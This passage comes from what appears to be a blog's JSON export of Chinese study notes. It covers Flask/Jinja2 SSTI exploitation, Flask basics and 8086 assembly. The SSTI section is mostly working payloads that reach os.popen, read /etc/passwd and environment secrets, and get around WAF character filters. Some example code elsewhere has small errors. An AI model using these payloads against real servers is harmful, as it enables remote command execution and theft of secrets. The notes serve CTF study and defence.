a&#x3D;dict(__class__&#x3D;1)|join% &#125;\n&#123; %set b&#x3D;dict(__base__&#x3D;1)|join% &#125;\n&#123; %set c&#x3D;dict(__subclasses__&#x3D;1)|join% &#125;\n&#123; %set d&#x3D;dict(__getitem__&#x3D;1)|join% &#125;\n&#123; %set e&#x3D;dict(__in&#x3D;1,it&#x3D;2)|join% &#125;\n&#123; %set f&#x3D;dict(__glo&#x3D;1,bals__&#x3D;2)|join% &#125;\n&#123; %set g&#x3D;dict(popen&#x3D;1)|join% &#125;\n&#123; %set kg&#x3D;&#123;&#125;|select()|string()|attr(d)(10)% &#125;     #空格\n&#123; %set i&#x3D;(dict(cat&#x3D;1)|join,kg,dict(flag&#x3D;2)|join)|join% &#125;\n&#123; %set r&#x3D;dict(read&#x3D;1)|join% &#125;\n&#123; &#123;()|attr(a)|attr(b)|attr(c)|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()&#125; &#125;\n示例2：WAF过滤  &#39;,&quot;,&#39;_&#39;,&#39;0-9&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;.&#39;\\&#39;,&#39;&#39;\npaylaod原型:&#123; &#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__item__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125; &#125;\npayload:\n&#123; %set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;\n&#123; %set eighteen&#x3D;nine+nine% &#125;\n&#123; %set pop&#x3D;dict(pop&#x3D;a)|join% &#125;\n&#123; %set xhx&#x3D;(lipsum|string|list)|attr(pop)(eighteen)% &#125;\n&#123; %set kg&#x3D;(lipsum|string|list)|attr(pop)(nine)% &#125;\n#得到下划线xhx&#39;_&#39;和空格kg&#39; &#39;\n&#123; %set globals&#x3D;(xhx,xhx,dict(globals&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set getitem&#x3D;(xhx,xhx,dict(getitem&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set os&#x3D;dict(os&#x3D;a)|join% &#125;\n&#123; %set popen&#x3D;dict(popen&#x3D;a)|join% &#125;\n&#123; %set flag&#x3D;(dict(cat&#x3D;a)|join,kg,dict(flag&#x3D;a)|join)|join&#125;\n&#123; %set read&#x3D;dict(read&#x3D;a)|join&#125;\n&#123; &#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125; &#125;\n\n姿势集(来源https://zhuanlan.zhihu.com/p/93746437)\n1.{ {config} } 可以获取当前设置，如果题目是这样的：app.config [&#39;FLAG&#39;] &#x3D; os.environ.pop（&#39;FLAG&#39;）\n\n可以直接访问 { {config[‘FLAG’]} } 或者 { {config.FLAG} } 得到 flag。\n2.同样可以找到 config。&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取当前 Flask 应用程序上下文中的配置信息。\n&#96;self&#96; 表示模板上下文对象，&#96;__dict__&#96; 返回该对象储存的属性和值的字典，\n&#96;_TemplateReference__context&#96; 是表示调用上下文槽时使用的内部插槽名称。\n最终访问 &#96;config&#96; 属性可以得到应用程序的配置信息。\n&#39;&#39;&#39;\n\n3.环境变量&#123; &#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取 Flask 程序中环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n首先创建一个空列表 &#96;[]&#96;，然后通过 &#96;. __class__&#96; 获取它的类 &#96;&lt;class &#39;list&#39;&gt;&#96;。\n再通过 &#96;.__base__&#96; 方法获取其基础类，即 &#96;&lt;class &#39;object&#39;&gt;&#96;。\n接着通过 &#96;.__subclasses__()&#96; 方法获取所有子类，得到一个列表。\n然后查询这个列表中下标为 &#96;68&#96; 的子类，得到 &#96;&lt;class &#39;posix.ScandirIterator&#39;&gt;&#96;。\n对该子类的 &#96;__init__&#96; 初始化函数进行取值并访问 &#96;__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#96; \n就可以获取环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n&#39;&#39;&#39;\n\n4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等这是 Flask 中一些常用的对象或方法：\n&#39;&#39;&#39;\n- &#96;url_for&#96;：生成 URL。\n- &#96;g&#96;：应用程序上下文中存储数据的齿轮。在请求之间共享数据。\n- &#96;request&#96;：表示客户端发出的请求。\n- &#96;namespace&#96;：命名空间，常常用于优化 url_for。\n- &#96;lipsum&#96;：快速生成 Lorem Ipsum 文本。\n- &#96;range&#96;：Python 内置函数，用于生成一个固定区间内的整数序列。\n- &#96;session&#96;：应用程序上下文中用户会话存储数据的地方。在请求之间共享数据。\n- &#96;dict&#96;：Python 内置类型，字典类型，用于保存键-值对。\n- &#96;get_flashed_messages&#96;：从请求中弹出闪现消息。\n- &#96;cycler&#96;：Matplotlib 库中的循环器，用于对颜色、线条风格等元素进行迭代访问。\n- &#96;joiner&#96;：用于拼接字符串。\n- &#96;config&#96;：Flask 应用程序全局配置。\n&#39;&#39;&#39;\n\n如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#url_for.__globals__[&#39;current_app&#39;]，表示获取当前应用程序实例中的全局变量；\n#然后通过 config.FLAG 获取环境变量 FLAG 的值。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#get_flashed_messages.__globals__[&#39;current_app&#39;]，同样表示获取当前应用程序实例中的全局变量；\n#然后再次通过 config.FLAG 获取环境变量 FLAG 的值。\n#该函数主要用于传递闪现消息给用户，而在这里被“利用”以获取环境变量。\n&#123; &#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125; &#125;\n#在获取到 request 对象和 current_app 对象后，使用 _get_data_for_json() 方法将请求数据编码为 json 格式，\n#并使用 json 库进行编码。由于 flask 使用了自定义的 JSONEncoder 类，\n#所以我们通过 json.JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;] 来访问环境变量。\n\n5.过滤了 []、.pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。\n&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()\n\n在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。\n若.也被过滤，使用原生 JinJa2 函数 |attr()\n即将 request.__class__ 改成 request|attr(&quot;__class__&quot;)\n6.过滤下划线 _利用 request.args 的属性\n\n&#123; &#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。\nGET:\n\n&#123; &#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;\n\nPOST:\nclass&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n7.过滤引号 “request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。\n&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd\n\n8.一些关键字被过滤。base64编码绕过用于__getattribute__使用实例访问属性时。\n例如，过滤掉 __class__ 关键词\n&#123; &#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n\n字符串拼接绕过\n&#123; &#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n&#123; &#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&#125; &#125; ","slug":"ssti1","date":"2023-04-21T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"1e1792beaab2c135cf1beec290eff7af","title":"ssti模板注入学习笔记-flask前置知识","content":"flask是一个使用python编写的轻量级web应用框架\npython可以直接用flask启动一个web服务页面\ncd &#x2F;opt&#x2F;flask1\nsource .&#x2F;bin&#x2F;activate\ncd &#x2F;root\nvim demo.py\npython3 demo.py\n\n其中demo.py文件:\nfrom flask import Flask     #启动flask模块，创建一个Flask类\napp &#x3D; Flask(__name__)       #__name__是系统变量，指的是本py文件的文件名\n\n#路由：基于浏览器输入的字符串寻址\n@app.route(&#39;&#x2F;world&#39;)             \ndef hello():\n    return &quot;hello world&quot;\n@app.route(&#39;&#x2F;man&#39;)             \ndef hello():\n    return &quot;hello man&quot;\n\n#只能被python直接运行，而不能被作为组件或模块被调用\nif __name__&#x3D;&#x3D;&#39;__main__&#39;: \n    app.run(debug&#x3D;True,host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;8081)      #改完配置自动生效\n    #debug建议只能在学习中开启  host&#x3D;&quot;0.0.0.0&quot;监听所有的物理接口\n\nflask变量规则通过向规则参数添加变量部分，可以动态构建URL\nfrom flask import Flask\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)\ndef hello(name):\n    return &quot;hello %s&quot; % name\n@app.route(&#39;int&#x2F;&lt;ID&gt;&#39;)\ndef hello(ID):\n    return &quot;hello %d&quot; % ID\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.run(debug&#x3D;True)\n\nflask HTTP方法在python demo.py中插入路由:\n@app.route(&#39;&#x2F;login&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;])\ndef login():\n    if request.method &#x3D;&#x3D; &#39;POST&#39;:\n        print(1)\n        user &#x3D; request.form[&#39;ben&#39;]\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))     #redirect重定向\n    else:\n        print(2)\n        user &#x3D; request.args.get(&#39;ben&#39;)\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))\n\nflask模板视图函数：主要作用是生成请求的相应把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本\n使用模板：使用静态的页面html展示动态的内容模板是一个响应文本的文件，其中使用占位符（变量）表示动态部分。代码结构清晰，耦合度低\n· 处理业务逻辑：视图函数只负责业务逻辑和数据处理\n· 返回相应内容：模板取到视图函数的数据结果来进行展示\n\nrender_template加载html文件，默认文件路径在templates目录下。\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    return render_template(&quot;index.html&quot;)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n在templates目录下创建index.html文件\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Title&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    模板html展示页面\n&lt;br&gt;\n    &#123;&#123;my_str&#125;&#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n两者结合：\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;dazhuang&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template(&quot;index.html&quot;,\n    my_str&#x3D;my_str,\n    my_int&#x3D;my_int,\n    my_arry&#x3D;my_array,\n    my_dict&#x3D;my_dict\n    )\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\nrender_template_string用于渲染字符串，直接定义内容\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;nannan&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template_string(&#39;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;title&gt;Title&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;模板html展示页面&lt;br&gt;%d&lt;br&gt;%s&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39; % (my_int,my_str))\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\npython中的继承关系父类和子类（子类调用父类下的其他子类）~python flask脚本没有办法直接执行python指令object是父子关系的顶端，所有数据类型最终的父类都是object\nclass A:pass\nclass B(A):pass\nclass C(B):pass\nclass D(B):pass\nc &#x3D; c()\n\nprint(c.__class__)                              # &lt;class &#39;__main__.C&#39;&gt; 当前类C\nprint(c.__class__.__base__)                     # &lt;class &#39;__main__.B&#39;&gt; 当前类的父类B\nprint(c.__class__.__base__.__base__)            # &lt;class &#39;__main__.A&#39;&gt;\nprint(c.__class__.__base__.__base__.__base__)   # &lt;class &#39;object&#39;&gt;\nprint(c.__class__.__mro__)                      # 上面四个层层递进一起输出\nprint(c.__class__.__base__.__subclasses__())    # B下的所有子类（数组形式）\nprint(c.__class__.__base__.__subclasses__()[1]) #调用子类D\n\n魔术方法__class__           #查找当前类型的所属对象\n__base__            #沿着父子类的关系往上走一个\n__mro__             #查找当前类对象的所有继承类\n__subclasses__()    #查找父类下的所有子类\n\n简单的payload（注意类型）\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;    #str类型\n&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;    #list类型\n&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;    #元组类型\n\n然后，寻找一些关键的模块\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n#例如：os.wrap_close       #找到对应的列数\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117]&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;\n# __builtins__提供对python的所有&quot;内置&quot;标识符的直接访问\n# eval()计算字符串表达式的值\n# popen()执行一个shell以运行命令来开启一个进程\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;\n#这里也可以直接调用\n\n\n\n\n","slug":"flask_study","date":"2023-04-14T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"c056fa5ea8e6220d71e866be2b6f171d","title":"8086汇编学习笔记_01","content":"一、寄存器（CPU工作原理）CPU概述\n\n运算器，控制器，寄存器等器件，这些器件靠内部总线相连；\n\n8086 CPU 有14个寄存器：\nAX BX CX DX SI DI SP BP IP CS SS DS ES PSW\n\n通用寄存器有8个, 又可以分成2组,\n一组是数据寄存器(4个),另一组是指针寄存器及变址寄存器(4个).\n\n1.据寄存器分为:\n　　AH&amp;AL＝AX(accumulator)：累加寄存器，常用于运算;\n在乘除等指令中指定用来存放操作数,\n另外,所有的I&#x2F;O指令都使用这一寄存器与外界设备传送数据.\n　　BH&amp;BL＝BX(base)：基址寄存器，常用于地址索引；\n　　CH&amp;CL＝CX(count)：计数寄存器，常用于计数；\n常用于保存计算值,如在移位指令,循环(loop)和串处理指令中用作隐含的计数器.\n　　DH&amp;DL＝DX(data)：数据寄存器，常用于数据传递。\n　　他们的特点是,这4个16位的寄存器可以分为高8位: AH, BH, CH, DH.\n    以及低八位：AL,BL,CL,DL。这2组8位寄存器可以分别寻址，并单独使用。\n\n2.另一组是指针寄存器和变址寄存器，包括：\n　　SP（Stack Pointer）：堆栈指针，与SS配合使用，可指向目前的堆栈位置；\n　　BP（Base Pointer）：基址指针寄存器，可用作SS的一个相对基址位置；\n　　SI（Source Index）：源变址寄存器可用来存放相对于DS段之源变址指针；\n　　DI（Destination Index）：目的变址寄存器，\n可用来存放相对于 ES 段之目的变址指针。\n\nDS(DATA SEGMENT)数据段寄存器，用于定义数据；\nCS(CODE SEGMENT)代码段寄存器，用于存放代码；\nSS(STACK SEGMENT)堆栈段寄存器，用于存放入栈数据；\nES(EXTRA SEGMENT)附加段寄存器，用于存放串操作的目的操作数和辅助存储；\n\nIP（instruction pointer）指令指针，与CS代码段配合使用，指向指令的偏移地址。\nFR（flag register）或PSW（programme status word）标志&#x2F;程序状态字寄存器，\n是一个特殊的寄存器，按位起作用，用来控制CPU的工作方式或存放相关指令的执行状态。\n有意义的有9位，其中6位状态位，3位控制位。状态位用来记录执行结果的状态。\n包括ZF（结果为0）、PF（结果中1的奇偶）、SF（正负符号）、\nCF（无符号数最高位进位值）、OF（结果溢出）、AF（辅助进位）；\n控制位包括DF（方向标志位，控制串处理指令中SI,DI的增减）、\nIF（中断允许）、TF（是否允许单步中断跟踪调试）。\n\n1. 通用寄存器8086 CPU所有的寄存器都是16位的，可以存放两个字节。\nAX BX CX DX 通用寄存器\nAX –&gt; AH + AL\n2. 字在寄存器中的存储一个字可以存在一个16位寄存器中；\n3. 几条汇编指令汇编指令不区分大小写；\nmov ax,18   将18送入AX      AX&#x3D;18add ax,8    将寄存器AX中的数值加上8     AX&#x3D;AX+8\n4. 物理地址CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间。\n我们将这个唯一的地址称为物理地址。\n5. 16位结构的CPU特征1.运算器一次最多可以处理16位的数据；\n2.寄存器的最大宽度为16位；\n3.寄存器和运算器之间的通路是16位；\n6. 8086 CPU给出物理地址的方法8086有20位地址总线，可传送20位地址，寻址能力为1M。\n8086内部为16位结构，它只能传送16位的地址，表现出的寻址能力却只有64KB。\n\n地址加法器工作原理:\n\n段地址x16+偏移地址&#x3D;物理地址\n# 段地址x16 --&gt; 数据左移4位\n\n7. 段的概念内存并没有分段。\n段的划分来自于CPU，由于8086 CPU用“段地址x16+偏移地址&#x3D;物理地址”的方式给存储内存单元的物理地址，使得我们可以用分段的方式是来管理内存。\n段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数；偏移地址为16位，16位地址的寻址能力为64k，所以一个段的长度最大为64k；\n8. 内存单元地址小结CPU访问内存单元时，必须向内存提供内存单元的物理地址；8086 CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址。\n9. 段寄存器段寄存器时提供段地址的。\nCS DS SS ES 段寄存器\n当8086 CPU要访问内存时，由这4个段寄存器提供内存单元的段地址。\n10. CS和IPCS和IP时8086 CPU中最关键的寄存器，他们指示了CPU当前要读取指令的地址。\nCS为代码段寄存器；IP为指令指针寄存器。\n\n8086 PC工作过程的简单描述：\n1.从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；\n2.IP&#x3D;IP+所读取指令的长度，从而指向下一条指令；\n3.执行指令。转到1，重复这个过程。\n11. 修改CS,IP的指令在CPU中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对CPU的控制。\nCPU从何处执行指令是由CS,IP中的内容决定的，程序员可以通过改变CS,IP中的内容来控制CPU执行目标指令。\nmov指令可以改变8086 CPU大部分寄存器的值，被称为传送指令。\nmov指令不能用于设置CS,IP的值，8086 CPU没有提供这样的功能。8086 CPU为CS,IP提供了另外的指令来改变它们的值：转移指令。\n# 同时修改CS,IP的内容：\njmp 段地址：偏移地址\n# 功能：用指令中给出的段地址修改CS，偏移地址修改IP。\n\n#仅修改IP的内容：\njmp 某一合法寄存器\n# 功能：用寄存器中的值修改IP。\n\n12. 代码段对于8086 PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。\n1.段地址在8086 CPU的寄存器中存放。当8086 CPU要访问内存时，由段寄存器提供内存单元的段地址。8086 CPU有4个段寄存器，其中CS用来存放指令的段地址。\n2.CS存放指令的段地址，IP存放指令的偏移地址。\n8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行。\n3.8086 CPU的工作过程：\n· 从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；\n· IP指向下一条指令；\n· 执行指令。（转到开头，重复这个过程）\n\n4.8086 CPU提供转移指令jmp修改CS,IP的内容。\n13. debug功能用Debug的r命令查看，改变CPU寄存器的内容；用Debug的d命令查看内存中的内容；用Debug的e命令改写内存中的内容；用Debug的u命令将内存中的机器指令翻译成汇编指令；用Debug的t命令执行一条机器指令；用Debug的a命令以汇编指令的格式在内存中写入一条机器指令；\n记忆：true ad （真 广告）\n二、寄存器（内存访问）1. 内存中字的存储任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可以看成一个地址为N的子单元中的高位字节单元和低位字节单元。\n2. DS和[address]CPU要读取一个内存单元的时候，必须先给出这个内存单元的地址；在8086 PC中，内存地址由段地址和偏移地址组成；8086 CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址。\n&#x2F;&#x2F; 读取10000H单元的内容:\nmov bx,1000H\nmov ds,bx\nmov al,[0]      &#x2F;&#x2F; mov [0],al\n&#x2F;&#x2F; 将10000H（1000:0）中的数据读到al中。\n\n\n&#x2F;&#x2F; mov指令可完成的两种传送功能：\n&#x2F;&#x2F; 1.将数据直接送入寄存器；\n&#x2F;&#x2F; 2.将一个寄存器中的内容送入另一个寄存器中;\n&#x2F;&#x2F; 除此之外，mov指令还可以将一个内存单元中的内容送入一个寄存器。\n\n&#x2F;&#x2F;mov ds,1000H是非法的。\n\n执行指令时，8086CPU自动取DS中的数据为内存单元的段地址。\n数据-&gt;通用寄存器-&gt;段寄存器\n3. 字的传送因为8086CPU是16位结构，有16根数据线，所以，可以一次性传送16位数据，也就是一次性传送一个字。\nmov bx,1000H\nmov ds,bx\nmov ax[0]   ;1000:0处的字型数据送入ax\nmvo[0],cx   ;cx中的16位数据送到1000:0处\n\n4. mov、add、sub指令&#x2F;&#x2F; 已学mov指令的几种形式：\nmov 寄存器，数据\nmov 寄存器，寄存器\nmov 寄存器，内存单元\nmov 内存单元，寄存器\n\n&#x2F;&#x2F;add和sub指令同mov一样，都有两个操作对象。\n\nmov 段寄存器，寄存器\n\n5. 数据段我们可以将一组长度为N（N &lt;&#x3D; 64k）、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段。\n· 参考一：\nmov ax,123BH\nmov ds,ax       ;将123BH送入ds中，作为数据段的段地址\nmov al,0        ;用al存放累加结果\nadd al,[0]      ;将数据段第一个单元（偏移地址为0）中的数值加到al中\nadd al,[1]      ;将数据段第二个单元（偏移地址为1）中的数值加到al中\nadd al,[2]      ;将数据段第三个单元（偏移地址为2）中的数值加到al中\n\n注意：一个字型数据占两个单元，所以偏移地址是0、2、4\n· 参考二：\nmov ax,123BH\nmov ds,ax       ;将123BH送入ds中，作为数据段的段地址\nmov ax,0        ;用ax存放累加结果\nadd al,[0]      ;将数据段第一个单元（偏移地址为0）中的数值加到al中\nadd al,[2]      ;将数据段第二个单元（偏移地址为1）中的数值加到al中\nadd al,[4]      ;将数据段第三个单元（偏移地址为2）中的数值加到al中\n\n部分小结\n· 字在内存中存储时，要用两个地址连续的内存单元来存放，字的低位字节存放在地地址单元中，高位字节存放在高地址单元中。· 用mov指令要访问内存单元，可以在mov指令中只给出单元的偏移地址，此时，段地址默认在DS寄存器中。· [address]表示一个偏移地址为address的内存单元。· 在内存和寄存器之间传送字符数据时，高地址单元和高8位寄存器、低地址单元和低8位寄存器相对应。· mov、add、sub是具有两个操作对象的指令。jmp是具有一个操作对象的指令。· 可以根据自己的推测，在Debug中实验指令的新格式。\n6. 栈栈是一种具有特殊的访问方式的存储空间。它的特殊性在于，最后进入这个空间的数据，最先出去。\n栈有两个基本的操作：入栈和出栈。\n入栈：将一个新的元素放到栈顶。\n出栈：从栈顶去除一个元素。\n\n栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出。\n栈的操作规则：LIFO（Last In First Out， 后进先出）\n7. CPU提供的栈机制8086CPU提供入栈和出栈指令：（最基本的）\nPUSH（入栈）\nPOP（出栈）\n\npush ax：将寄存器ax中的数据送入栈中；pop ax：从栈顶取出数据送入ax。\n8086CPU的入栈和出栈操作都是以字为单位进行的。\nmov ax,0123H\npush ax\nmov bx,2266H\npush bx\nmov cx 1122H\npush cx\npop ax      ;ax&#x3D;1122H\npop bx      ;bx&#x3D;2266H\npop cx      ;cx&#x3D;0123H\n\n两个疑问\n1.CPU如何知道当前要执行的指令所在的位置？\n答:寄存器CS和IP中存放着当前指令的段地址和偏移地址。\n\n8086CPU中，有两个寄存器：\n段寄存器SS  存放栈顶的段地址\n寄存器SP    存放栈顶的偏移地址\n\n数据-&gt;通用寄存器-&gt;段寄存器\n\n任意时刻，SS:SP指向栈顶元素。\n\n2.执行push和pop的时候，如何知道哪个单元是栈顶单元？\n\npush ax\n· SP&#x3D;SP-2;\n· 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。\n\npop ax\n· 将SS:SP指向的内存单元处的数据送入ax中；\n· SP&#x3D;SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。\n\n注意：出栈后，SS:SP指向新的栈顶，pop操作前的栈顶元素依然存在，但已不在栈中；\n    再次执行push等入栈指令后，会写入新的数据，它将被覆盖。\n\n\n\n任意时刻，SS:SP指向栈顶元素，\n当栈为空的时候，栈中没有元素，也就不存在栈顶元素；\n所以SS:SP只能指向栈的最底部单元下面的单元，\n该单元的偏移地址为栈最底部的字单元的偏移地址+2；\n栈最底部字单元的地址为1000：000E，所以栈空时，SP&#x3D;0010H；\n\n8. 栈顶超界的问题当栈满的时候再使用push指令入栈，栈空的时候再使用pop指令出栈，都将发生栈顶超界问题。\n栈顶超界时危险的。\n9. push、pop指令push和pop指令是可以在寄存器和内存之间传送数据的。\n&lt;!--栈与内存--&gt;\n栈空间当然也是内存空间的一部分，\n它只是一段可以以一种特殊的方式进行访问的内存空间。\n\npush 寄存器：将一个寄存器中的数据入栈；\npop 寄存器：出栈，用一个寄存器接收出栈的数据；\n\npush 段寄存器：将一个段寄存器中的数据入栈；\npop 段寄存器：出栈，用一个段寄存器接收出栈的数据；\n\npush 内存单元：将一个内存单元处的字入栈（栈操作都是以字为单位）；\npop 内存单元：出栈，用一个内存字单元接受出栈的数据；\n例如：\npush[0]\npop[2]\n&lt;!--指令执行时，CPU要知道内存单元的地址，\n可以在push、pop指令中给出内存单元的偏移地址，\n段地址在指令执行时，CPU从 ds 中取得。--&gt;\n\n结论：push、pop实质上就是一种内存传送指令，可以在寄存器和内存之间传送数据，与mov指令不同的是，push和pop指令访问的内存单元的地址不是在指令中给出的，而是由SS:SP指出的。同时，push和pop指令还要改变SP中的内容。\n执行push时：先改变SP，后向SS:SP处传送；执行pop时：先读取SS:SP处的数据，后改变SP；\n注意：push、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH。\n提示：SS、SP只是栈顶；改变SP后写内存的入栈指令；读内存后改变SP的出栈指令。\n这就是8086CPU提供的栈操作机制。\n10. 栈段我们可以将长度为N（ N &lt;&#x3D; 64K ）的一组 地址连续、起始地址为16的倍数的内存单元，当作栈来用，从而定义了一个栈段。\n任意时刻，SS:SP指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以SS:SP只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2，栈最底部字单元的地址为1000:FFFE，多以栈空时，SP&#x3D;0000H。\nmov ax,1000H\nmov ss,ax\nmov sp,0020H\nmov ax,cs\nmov ds,ax\nmov ax,[0]\nadd ax,[2]\nmov bx,[4]\nadd bx,[6]\npush ax\npush bx\npop ax\npop bx\n\n一段内存，可以既是代码的存储空间，又是数据的存储空间，还可以是栈空间，也可以什么也不是。关键在于CPU中寄存器的设置，即：CS,IP,SS,SP,DS的指向。\n","slug":"8086汇编01","date":"2023-07-14T03:20:34.000Z","categories_index":"文章","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"2872e18edcfe70db45537a6abab5f8bb","title":"8086汇编学习笔记_02","content":"汇编语言程序1. 一个源程序从写出到执行的过程&#x2F;&#x2F; 简要过程：\n编写 -&gt; 编译链接 -&gt; 执行\n\n执行可执行文件中的程序：操作系统按照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化（比如：设置CS:IP指向第一条要执行的指令），然后由CPU执行程序。\n2. 源程序assume 